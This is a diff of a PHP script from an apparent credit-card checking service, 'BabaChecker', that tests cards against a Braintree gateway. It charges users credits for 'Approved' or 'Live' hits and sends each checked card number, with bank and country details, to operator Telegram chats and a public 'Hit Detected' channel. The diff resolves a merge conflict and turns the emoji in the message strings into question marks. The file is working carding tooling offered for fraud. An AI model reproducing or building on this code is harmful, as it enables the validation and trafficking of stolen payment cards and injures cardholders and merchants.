@@ -1,4 +1,4 @@
-﻿<?php
+<?php
 declare(strict_types=1);
 require_once __DIR__ . '/../../app/Bootstrap.php'; // Adjusted path
 require_once __DIR__ . '/../../app/Db.php';
@@ -253,7 +253,7 @@ $dead_responses = [
     "We cannot process your oder" => "We cannot process your order",
     "ProxyError" => "Proxy Connection Refused"
 ];
-$liveResponses = ['Live ✅', 'Insufficient Funds', 'Card Issuer Declined CVV'];
+$liveResponses = ['Live ?', 'Insufficient Funds', 'Card Issuer Declined CVV'];
 // Check for Approved response first
 if (
     (stripos($response, 'Payment method successfully added.') !== false) ||
@@ -266,35 +266,32 @@ if (
     $new_credits = updateCredits($pdo, $uid, 3, true, false); // 1 credit for Approved
     $fullResult =
         "<b>#BraintreeAuth2</b>\n" .
-        "━━━━━━━━━━━\n" .
-        "[ﾒ] <b>Card ➜</b> <code>{$cc1}</code>\n" .
-        "[ﾒ] <b>Status ➜</b> Approved ✅\n" .
-        "[ﾒ] <b>Response ➜</b> {$err} 🎉\n" .
-        "[ﾒ] <b>Gateway ➜</b> Braintree Auth 2\n" .
-        "━━━━━━━━━━━\n" .
-        "[ﾒ] <b>Info ➜</b> {$binInfo['brand']} - {$binInfo['card_type']} - {$binInfo['level']}\n" .
-        "[ﾒ] <b>Bank ➜</b> {$binInfo['issuer']}\n" .
-        "[ﾒ] <b>Country ➜</b> {$binInfo['country_info']}\n" .
-        "━━━━━━━━━━━\n" .
-        "[ﾒ] <b>Checked By ➜</b> " . htmlspecialchars($userFullName) . " [" . htmlspecialchars($userStatus) . "]\n" .
-        "[ㇺ] <b>Dev ➜</b> babachecker";
+        "???????????\n" .
+        "[?] <b>Card ?</b> <code>{$cc1}</code>\n" .
+        "[?] <b>Status ?</b> Approved ?\n" .
+        "[?] <b>Response ?</b> {$err} ??\n" .
+        "[?] <b>Gateway ?</b> Braintree Auth 2\n" .
+        "???????????\n" .
+        "[?] <b>Info ?</b> {$binInfo['brand']} - {$binInfo['card_type']} - {$binInfo['level']}\n" .
+        "[?] <b>Bank ?</b> {$binInfo['issuer']}\n" .
+        "[?] <b>Country ?</b> {$binInfo['country_info']}\n" .
+        "???????????\n" .
+        "[?] <b>Checked By ?</b> " . htmlspecialchars($userFullName) . " [" . htmlspecialchars($userStatus) . "]\n" .
+        "[?] <b>Dev ?</b> babachecker";
     if (!empty($telegramId)) {
         sendTelegramMessage($botToken, $telegramId, $fullResult);
     }
     sendTelegramMessage($botToken, '-1002890276135', $fullResult);
     $publicMessage =
-        "<b>Hit Detected ✅</b>\n" .
-        "━━━━━━━━\n" .
-        "<b>User ➜</b> " . htmlspecialchars($userFullName) . " [" . htmlspecialchars($userStatus) . "]\n" .
-        "<b>Status ➜</b> <b>Approved ✅</b>\n" .
-        "<b>Response ➜</b> {$err} 🎉\n" .
-        "<b>Gateway ➜</b> Braintree Auth 2\n" .
-        "━━━━━━━━\n" .
-<<<<<<< HEAD
-        "<b>Hit From ➜</b> <a href=\"https://ethnix.net\">BabaChecker</a>";
-=======
-        "<b>Hit From ➜</b> <a href=\"https://babachecker.com\">BabaChecker</a>";
->>>>>>> f0e10c4ddeefca130962ae1ec2a89d1fe968e85b
+        "<b>Hit Detected ?</b>\n" .
+        "????????\n" .
+        "<b>User ?</b> " . htmlspecialchars($userFullName) . " [" . htmlspecialchars($userStatus) . "]\n" .
+        "<b>Status ?</b> <b>Approved ?</b>\n" .
+        "<b>Response ?</b> {$err} ??\n" .
+        "<b>Gateway ?</b> Braintree Auth 2\n" .
+        "????????\n" .
+        "<b>Hit From ?</b> <a href=\"https://babachecker.com\">BabaChecker</a>";
+
     sendTelegramMessage($botToken, '-1002552641928', $publicMessage);
     echo json_encode([
         'status' => 'approved',
@@ -314,32 +311,32 @@ if (
     $new_credits = updateCredits($pdo, $uid, 1, true, false); // 1 credit for Live
     $fullResult =
         "<b>#BraintreeAuth2</b>\n" .
-        "━━━━━━━━━━━\n" .
-        "[ﾒ] <b>Card ➜</b> <code>{$cc1}</code>\n" .
-        "[ﾒ] <b>Status ➜</b> Live ✅\n" .
-        "[ﾒ] <b>Response ➜</b> {$err}\n" .
-        "[ﾒ] <b>Gateway ➜</b> Braintree Auth 2\n" .
-        "━━━━━━━━━━━\n" .
-        "[ﾒ] <b>Info ➜</b> {$binInfo['brand']} - {$binInfo['card_type']} - {$binInfo['level']}\n" .
-        "[ﾒ] <b>Bank ➜</b> {$binInfo['issuer']}\n" .
-        "[ﾒ] <b>Country ➜</b> {$binInfo['country_info']}\n" .
-        "━━━━━━━━━━━\n" .
-        "[ﾒ] <b>Checked By ➜</b> " . htmlspecialchars($userFullName) . " [" . htmlspecialchars($userStatus) . "]\n" .
-        "[ㇺ] <b>Dev ➜</b> babachecker";
+        "???????????\n" .
+        "[?] <b>Card ?</b> <code>{$cc1}</code>\n" .
+        "[?] <b>Status ?</b> Live ?\n" .
+        "[?] <b>Response ?</b> {$err}\n" .
+        "[?] <b>Gateway ?</b> Braintree Auth 2\n" .
+        "???????????\n" .
+        "[?] <b>Info ?</b> {$binInfo['brand']} - {$binInfo['card_type']} - {$binInfo['level']}\n" .
+        "[?] <b>Bank ?</b> {$binInfo['issuer']}\n" .
+        "[?] <b>Country ?</b> {$binInfo['country_info']}\n" .
+        "???????????\n" .
+        "[?] <b>Checked By ?</b> " . htmlspecialchars($userFullName) . " [" . htmlspecialchars($userStatus) . "]\n" .
+        "[?] <b>Dev ?</b> babachecker";
     if (!empty($telegramId)) {
         sendTelegramMessage($botToken, $telegramId, $fullResult);
     }
     sendTelegramMessage($botToken, '-1002890276135', $fullResult);
     
     // $publicMessage =
-    //     "<b>Hit Detected ✅</b>\n" .
-    //     "━━━━━━━━\n" .
-    //     "<b>User ➜</b> " . htmlspecialchars($userFullName) . " [" . htmlspecialchars($userStatus) . "]\n" .
-    //     "<b>Status ➜</b> <b>Live ✅</b>\n" .
-    //     "<b>Response ➜</b> {$err} \n" .
-    //     "<b>Gateway ➜</b> Braintree Auth 2\n" .
-    //     "━━━━━━━━\n" .
-    //     "<b>Hit From ➜</b> <a href=\"https://babachecker.net\">babachecker</a>";
+    //     "<b>Hit Detected ?</b>\n" .
+    //     "????????\n" .
+    //     "<b>User ?</b> " . htmlspecialchars($userFullName) . " [" . htmlspecialchars($userStatus) . "]\n" .
+    //     "<b>Status ?</b> <b>Live ?</b>\n" .
+    //     "<b>Response ?</b> {$err} \n" .
+    //     "<b>Gateway ?</b> Braintree Auth 2\n" .
+    //     "????????\n" .
+    //     "<b>Hit From ?</b> <a href=\"https://babachecker.net\">babachecker</a>";
     // sendTelegramMessage($botToken, '-1002552641928', $publicMessage);
 
     echo json_encode([
@@ -360,32 +357,32 @@ if (
     $new_credits = updateCredits($pdo, $uid, 1, true, false); // 1 credit for Live
     $fullResult =
         "<b>#BraintreeAuth2</b>\n" .
-        "━━━━━━━━━━━\n" .
-        "[ﾒ] <b>Card ➜</b> <code>{$cc1}</code>\n" .
-        "[ﾒ] <b>Status ➜</b> Live ✅\n" .
-        "[ﾒ] <b>Response ➜</b> {$err}\n" .
-        "[ﾒ] <b>Gateway ➜</b> Braintree Auth 2\n" .
-        "━━━━━━━━━━━\n" .
-        "[ﾒ] <b>Info ➜</b> {$binInfo['brand']} - {$binInfo['card_type']} - {$binInfo['level']}\n" .
-        "[ﾒ] <b>Bank ➜</b> {$binInfo['issuer']}\n" .
-        "[ﾒ] <b>Country ➜</b> {$binInfo['country_info']}\n" .
-        "━━━━━━━━━━━\n" .
-        "[ﾒ] <b>Checked By ➜</b> " . htmlspecialchars($userFullName) . " [" . htmlspecialchars($userStatus) . "]\n" .
-        "[ㇺ] <b>Dev ➜</b> babachecker";
+        "???????????\n" .
+        "[?] <b>Card ?</b> <code>{$cc1}</code>\n" .
+        "[?] <b>Status ?</b> Live ?\n" .
+        "[?] <b>Response ?</b> {$err}\n" .
+        "[?] <b>Gateway ?</b> Braintree Auth 2\n" .
+        "???????????\n" .
+        "[?] <b>Info ?</b> {$binInfo['brand']} - {$binInfo['card_type']} - {$binInfo['level']}\n" .
+        "[?] <b>Bank ?</b> {$binInfo['issuer']}\n" .
+        "[?] <b>Country ?</b> {$binInfo['country_info']}\n" .
+        "???????????\n" .
+        "[?] <b>Checked By ?</b> " . htmlspecialchars($userFullName) . " [" . htmlspecialchars($userStatus) . "]\n" .
+        "[?] <b>Dev ?</b> babachecker";
     if (!empty($telegramId)) {
         sendTelegramMessage($botToken, $telegramId, $fullResult);
     }
     sendTelegramMessage($botToken, '-1002890276135', $fullResult);
     
     // $publicMessage =
-    //     "<b>Hit Detected ✅</b>\n" .
-    //     "━━━━━━━━\n" .
-    //     "<b>User ➜</b> " . htmlspecialchars($userFullName) . " [" . htmlspecialchars($userStatus) . "]\n" .
-    //     "<b>Status ➜</b> <b>Live ✅</b>\n" .
-    //     "<b>Response ➜</b> {$err} \n" .
-    //     "<b>Gateway ➜</b> Braintree Auth 2\n" .
-    //     "━━━━━━━━\n" .
-    //     "<b>Hit From ➜</b> <a href=\"https://babachecker.net\">babachecker</a>";
+    //     "<b>Hit Detected ?</b>\n" .
+    //     "????????\n" .
+    //     "<b>User ?</b> " . htmlspecialchars($userFullName) . " [" . htmlspecialchars($userStatus) . "]\n" .
+    //     "<b>Status ?</b> <b>Live ?</b>\n" .
+    //     "<b>Response ?</b> {$err} \n" .
+    //     "<b>Gateway ?</b> Braintree Auth 2\n" .
+    //     "????????\n" .
+    //     "<b>Hit From ?</b> <a href=\"https://babachecker.net\">babachecker</a>";
     // sendTelegramMessage($botToken, '-1002552641928', $publicMessage);
 
     echo json_encode([
@@ -443,8 +440,5 @@ if (
         ]);
         exit;
     }
-<<<<<<< HEAD
 }
-=======
-}
->>>>>>> f0e10c4ddeefca130962ae1ec2a89d1fe968e85b
+
